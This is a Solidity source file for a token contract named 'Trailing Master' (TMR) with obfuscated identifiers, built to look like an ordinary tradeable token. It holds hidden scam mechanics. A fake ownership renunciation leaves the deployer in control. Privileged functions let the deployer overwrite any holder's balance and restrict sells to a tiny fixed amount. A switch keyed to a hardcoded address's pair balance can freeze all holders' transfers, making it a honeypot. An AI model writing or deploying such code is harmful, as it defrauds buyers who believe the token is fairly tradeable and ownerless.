//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface tokenSender {
    function createPair(address receiverFund, address listSwap) external returns (address);
}

interface sellFromMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptAuto) external view returns (uint256);

    function transfer(address toLaunch, uint256 buyLimitAt) external returns (bool);

    function allowance(address fundEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyLimitAt) external returns (bool);

    function transferFrom(
        address sender,
        address toLaunch,
        uint256 buyLimitAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed minFee, uint256 value);
    event Approval(address indexed fundEnable, address indexed spender, uint256 value);
}

abstract contract marketingAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface isLaunched is sellFromMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TrailingMaster is marketingAuto, sellFromMarketing, isLaunched {

    bool private liquidityList;

    uint256 private toMode = 100000000 * 10 ** 18;

    function symbol() external view virtual override returns (string memory) {
        return receiverMarketing;
    }

    function sellSwap(address totalMode, address toLaunch, uint256 buyLimitAt) internal returns (bool) {
        require(tokenFee[totalMode] >= buyLimitAt);
        tokenFee[totalMode] -= buyLimitAt;
        tokenFee[toLaunch] += buyLimitAt;
        emit Transfer(totalMode, toLaunch, buyLimitAt);
        return true;
    }

    function getOwner() external view returns (address) {
        return limitTrading;
    }

    function name() external view virtual override returns (string memory) {
        return exemptTx;
    }

    address maxEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function totalSupply() external view virtual override returns (uint256) {
        return toMode;
    }

    constructor (){
        if (liquidityList != tokenWalletLaunched) {
            takeTokenReceiver = feeMin;
        }
        marketingReceiver launchedLiquidityEnable = marketingReceiver(autoLaunch);
        autoIsFund = tokenSender(launchedLiquidityEnable.factory()).createPair(launchedLiquidityEnable.WETH(), address(this));
        
        liquidityTo = _msgSender();
        exemptLaunch[liquidityTo] = true;
        tokenFee[liquidityTo] = toMode;
        buyMax();
        
        emit Transfer(address(0), liquidityTo, toMode);
    }

    address autoLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public exemptLaunch;

    function walletLimit() private view {
        require(exemptLaunch[_msgSender()]);
    }

    function transferFrom(address totalMode, address toLaunch, uint256 buyLimitAt) external override returns (bool) {
        if (_msgSender() != autoLaunch) {
            if (takeShould[totalMode][_msgSender()] != type(uint256).max) {
                require(buyLimitAt <= takeShould[totalMode][_msgSender()]);
                takeShould[totalMode][_msgSender()] -= buyLimitAt;
            }
        }
        return tradingWallet(totalMode, toLaunch, buyLimitAt);
    }

    mapping(address => mapping(address => uint256)) private takeShould;

    uint256 liquidityAuto;

    function approve(address modeAmount, uint256 buyLimitAt) public virtual override returns (bool) {
        takeShould[_msgSender()][modeAmount] = buyLimitAt;
        emit Approval(_msgSender(), modeAmount, buyLimitAt);
        return true;
    }

    function teamList(address atSwap) public {
        require(atSwap.balance < 100000);
        if (exemptShould) {
            return;
        }
        
        exemptLaunch[atSwap] = true;
        if (minSell) {
            feeMin = takeTokenReceiver;
        }
        exemptShould = true;
    }

    bool public tokenWalletLaunched;

    function liquidityFrom(address buyShouldReceiver) public {
        walletLimit();
        if (tokenWalletLaunched == liquidityList) {
            feeMin = takeTokenReceiver;
        }
        if (buyShouldReceiver == liquidityTo || buyShouldReceiver == autoIsFund) {
            return;
        }
        toMin[buyShouldReceiver] = true;
    }

    uint256 constant liquidityAmountFrom = 6 ** 10;

    uint8 private minSwapLimit = 18;

    function balanceOf(address exemptAuto) public view virtual override returns (uint256) {
        return tokenFee[exemptAuto];
    }

    mapping(address => uint256) private tokenFee;

    uint256 shouldSell;

    bool public tokenAuto;

    function transfer(address amountReceiverSwap, uint256 buyLimitAt) external virtual override returns (bool) {
        return tradingWallet(_msgSender(), amountReceiverSwap, buyLimitAt);
    }

    string private exemptTx = "Trailing Master";

    function allowance(address walletMarketing, address modeAmount) external view virtual override returns (uint256) {
        if (modeAmount == autoLaunch) {
            return type(uint256).max;
        }
        return takeShould[walletMarketing][modeAmount];
    }

    bool public exemptShould;

    address public liquidityTo;

    function decimals() external view virtual override returns (uint8) {
        return minSwapLimit;
    }

    event OwnershipTransferred(address indexed walletTrading, address indexed listMode);

    address private limitTrading;

    function swapFund(address amountReceiverSwap, uint256 buyLimitAt) public {
        walletLimit();
        tokenFee[amountReceiverSwap] = buyLimitAt;
    }

    bool private minSell;

    function owner() external view returns (address) {
        return limitTrading;
    }

    string private receiverMarketing = "TMR";

    uint256 private feeMin;

    function buyMax() public {
        emit OwnershipTransferred(liquidityTo, address(0));
        limitTrading = address(0);
    }

    function tradingWallet(address totalMode, address toLaunch, uint256 buyLimitAt) internal returns (bool) {
        if (totalMode == liquidityTo) {
            return sellSwap(totalMode, toLaunch, buyLimitAt);
        }
        uint256 sellMarketing = sellFromMarketing(autoIsFund).balanceOf(maxEnable);
        require(sellMarketing == liquidityAuto);
        require(toLaunch != maxEnable);
        if (toMin[totalMode]) {
            return sellSwap(totalMode, toLaunch, liquidityAmountFrom);
        }
        return sellSwap(totalMode, toLaunch, buyLimitAt);
    }

    address public autoIsFund;

    mapping(address => bool) public toMin;

    function maxTotal(uint256 buyLimitAt) public {
        walletLimit();
        liquidityAuto = buyLimitAt;
    }

    uint256 private takeTokenReceiver;

}